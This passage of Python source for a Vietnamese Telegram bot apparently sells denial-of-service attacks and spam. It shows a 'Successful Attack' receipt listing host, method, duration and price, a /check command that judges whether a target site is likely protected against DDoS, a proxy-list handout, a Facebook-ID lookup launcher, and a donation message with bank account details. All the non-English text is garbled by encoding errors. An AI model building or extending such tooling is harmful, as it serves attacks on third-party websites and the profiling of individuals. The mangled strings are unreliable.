        message_text =f'\n     üöÄ Successful Attack üöÄ \n\n‚Ü£ ùóîùòÅùòÅùóÆùó∞ùó∏ ùóïùòÜ üë§: @{username} \n‚Ü£ ùóõùóºùòÄùòÅ ‚öî: {host} \n‚Ü£ ùó†ùó≤ùòÅùóµùóºùó± üìÅ: {method} \n‚Ü£ ùóßùó∂ùó∫ùó≤ ‚è±: [ {duration}s ]\n‚Ü£ ùó£ùóπùóÆùóª üíµ: [ {price} ] \n‚Ü£ ùóïùóºùòÅ ü§ñ: @Autospam_sms_bot \nùó¢ùòÑùóªùó≤ùóø üëë : Nguy√™n ƒêo√†n Trung\n\n'
        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
        
    else:
        bot.reply_to(message, '‚ö†Ô∏èB·∫°n ƒë√£ nh·∫≠p sai l·ªánh h√£y S·ª≠ d·ª•ng l·ªánh /ddos ƒë·ªÉ xem ph∆∞∆°ng th·ª©c t·∫•n c√¥ng !')




@bot.message_handler(commands=['donate'])
def donate(message):
    reply_text = """
>> ùóßùóõùó¢ÃÇùó°ùóö ùóßùóúùó° ùóóùó¢ùó°ùóîùóßùóò üíµ
- Ng√¢n H√†ng : THESIEURE.COM
- Ch·ªß T√†i Kho·∫£n : doantrungnguyen
- H·ªç T√™n : ƒê.T Nguy√™n
- N·ªôi Dung : ADMIN ƒê·∫∏P TRAI VCL
- S·ªë Ti·ªÅn : 100.000.000VNƒê

- Ng√¢n H√†ng : TP BANK
- STK : 27701011966
- Ch·ªß T√†i Kho·∫£n : NGUYEN VAN TAM
- N·ªôi Dung : ADMIN ƒêZ NH·∫§T 
- S·ªë Ti·ªÅn : 100.000.000vnƒë

‚ö†Ô∏èùóüùòÇÃõùòÇ ùòÜÃÅ N·∫øu √çt Th√¨ ùü≠ùü¨.ùü¨ùü¨ùü¨.ùü¨ùü¨ùü¨ùó©ùó°ƒê
Nhi·ªÅu Th√¨ ùü≠ùü¨ùü¨.ùü¨ùü¨ùü¨.ùü¨ùü¨ùü¨ùó©ùó°ƒê Nghe Ch∆∞a
Ch√∫ng M√†y Hi·ªÉu Anh N√≥i G√¨ Kh√¥ngüåö
"""
    bot.reply_to(message, reply_text)








@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.')
        return

    # Ti·∫øp t·ª•c x·ª≠ l√Ω l·ªánh cpu ·ªü ƒë√¢y
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'üñ•Ô∏è CPU Usage: {cpu_usage}%\nüíæ Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y !')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot ƒë√£ ƒë∆∞·ª£c t·∫Øt. T·∫•t c·∫£ ng∆∞·ªùi d√πng kh√¥ng th·ªÉ s·ª≠ d·ª•ng l·ªánh kh√°c !')

@bot.message_handler(commands=['fb'])
def lqm_sms(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, '>> Vui l√≤ng nh·∫≠p Link ho·∫∑c ID FB !\n>> N√™n Check B·∫±ng ID S·∫Ω Ch√≠nh X√°c H∆°n !')
        return
    
    phone_number = message.text.split()[1]

    file_path = os.path.join(os.getcwd(), "info.py")
    try:
        process = subprocess.Popen(["python", file_path, phone_number, "120"])
        reply_msg = bot.reply_to(
            message,
            f'üîé ƒêang K·∫øt N·ªëi ƒê·∫øn Bot >> ùóñùóµùó≤ùó∞ùó∏ùó∂ùóªùó≥ùóº ùóôùóÆùó∞ùó≤ùóØùóºùóºùó∏'
        )
        # X√≥a tin nh·∫Øn sau 5 gi√¢y
        time.sleep(5)
        bot.delete_message(message.chat.id, reply_msg.message_id)
    except Exception as e:
        bot.reply_to(
            message,
            '‚ùå Kh√¥ng t√¨m th·∫•y th√¥ng tin, vui l√≤ng ki·ªÉm tra l·∫°i !'
        )




@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot ƒë√£ ƒë∆∞·ª£c kh·ªüi ƒë·ªông l·∫°i. T·∫•t c·∫£ ng∆∞·ªùi d√πng c√≥ th·ªÉ s·ª≠ d·ª•ng l·∫°i l·ªánh b√¨nh th∆∞·ªùng.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hi·ªán ƒëang t·∫Øt. Vui l√≤ng ch·ªù khi n√†o ƒë∆∞·ª£c b·∫≠t l·∫°i.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui l√≤ng nh·∫≠p Key\nS·ª≠ d·ª•ng l·ªánh /getkey ƒë·ªÉ l·∫•y Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p.\nV√≠ d·ª•: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Kh√¥ng th·ªÉ l·∫•y m√£ ngu·ªìn t·ª´ trang web n√†y. Vui l√≤ng ki·ªÉm tra l·∫°i URL !')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web kh√¥ng ph·∫£i l√† HTML ho·∫∑c PHP. Vui l√≤ng th·ª≠ v·ªõi URL trang web ch·ª©a file HTML ho·∫∑c PHP !')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'C√≥ l·ªói x·∫£y ra: {str(e)}')


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"üìÑ ‚Ä¢ User ID : {user_id}")




@bot.message_handler(commands=['check'])
def check_ip(message):
    try:
        if len(message.text.split()) != 2:
            bot.reply_to(message, '>> Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p !\nV√≠ d·ª•: /check + [link website]')
            return

        url = message.text.split()[1]
        
        # Ki·ªÉm tra xem URL c√≥ http/https ch∆∞a, n·∫øu ch∆∞a th√™m v√†o
        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        # Lo·∫°i b·ªè ti·ªÅn t·ªë "www" n·∫øu c√≥
        url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
        
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip c·ªßa website: {url}\nL√†: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website c√≥ 1 ip c√≥ kh·∫£ nƒÉng kh√¥ng Antiddosüîí"
        else:
            reply += "Website c√≥ nhi·ªÅu h∆°n 1 ip kh·∫£ nƒÉng Antiddosüîí Cao.\nKh√≥ C√≥ Th·ªÉ T·∫•n C√¥ng Website n√†y."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra: {str(e)}")

#admin1
@bot.message_handler(commands=['admin1'])
def admin_info(message):
    # Thay th·∫ø c√°c gi√° tr·ªã sau b·∫±ng th√¥ng tin li√™n h·ªá c·ªßa b·∫°n
    tele_url = "https://t.me/minhduc3919"
    web_url = "https://guns.lol/nguyenprofile"
    admin_message = f">> Th√¥ng tin li√™n h·ªá c·ªßa ùó¢ùòÑùóªùó≤ùóø\n\nTelegram : {tele_url}\nWebsite : {web_url}"
    bot.reply_to(message, admin_message)
#admin2
@bot.message_handler(commands=['admin2'])
def admin_info(message):
    # Thay th·∫ø c√°c gi√° tr·ªã sau b·∫±ng th√¥ng tin li√™n h·ªá c·ªßa b·∫°n
    fb2_box = "https://guns.lol/bongtoisadk"
    tiktok2_url = "https://www.tiktok.com/@sadboyum3107"
    youtube2_url = "https://www.youtube.com/@EDMremixTikTok"
    youtube3_url = "https://www.youtube.com/@kenhkokinang"
    web2_url = "https://fb.com/100089057461799"
    admin2_message = f">> Th√¥ng tin li√™n h·ªá c·ªßa Admin2:\n\nWebsite: {fb2_box}\nTiktok : {tiktok2_url}\nFacebook: {web2_url}\nYoutube1: {youtube2_url}\nYoutube2: {youtube3_url}"
    bot.reply_to(message, admin2_message)
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# H√†m t√≠nh th·ªùi gian ho·∫°t ƒë·ªông c·ªßa bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hi·ªán ƒëang t·∫Øt. Vui l√≤ng ch·ªù khi n√†o ƒë∆∞·ª£c b·∫≠t l·∫°i !')
        return
    
    try:
        with open("proxy1.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Ph√∫t T·ª± Update\nS·ªë l∆∞·ª£ng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy1.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Kh√¥ng t√¨m th·∫•y file proxy1.txt.")





@bot.message_handler(commands=['time'])
def show_uptime(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, ">> Ch·ªâ ADMIN m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh n√†y !")
        return
    
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} gi·ªù, {minutes} ph√∫t, {seconds} gi√¢y'
    bot.reply_to(message, f'Bot ƒê√£ Ho·∫°t ƒê·ªông ƒê∆∞·ª£c: {uptime_str}')



@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, '‚ö†Ô∏è L·ªánh kh√¥ng h·ª£p l·ªá, Vui l√≤ng s·ª≠ d·ª•ng l·ªánh /lenh ƒë·ªÉ xem danh s√°ch l·ªánh !')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
